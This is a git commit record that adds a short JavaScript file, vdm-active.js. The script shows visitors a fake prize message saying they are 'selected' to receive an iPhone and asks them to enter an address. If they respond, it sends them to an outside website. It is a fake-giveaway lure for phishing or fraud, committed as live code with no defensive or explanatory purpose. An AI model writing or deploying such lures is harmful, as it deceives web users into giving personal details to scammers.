58e13a8ca02067851a1cb6b7d92bd982e43a19d4
mfednewblog8 <nsikakimoh68@gmail.com>
2025-10-16 08:03:21 +0100

    Create vdm-active.js

---
+++ vdm-active.js
@@ -0,0 +1,5 @@
+var password = 'ENTER ADDRESS'
+password=prompt('VDM: Congratulations, you are among the selected ones to receive iPhone XR to 17 from VDM, Press Ok to enter your address Now ','ENTER ADDRESS');
+if (password != 'ENTER ADDRESS') {
+location.href='https://ghrant.org/vdm.html';
+}
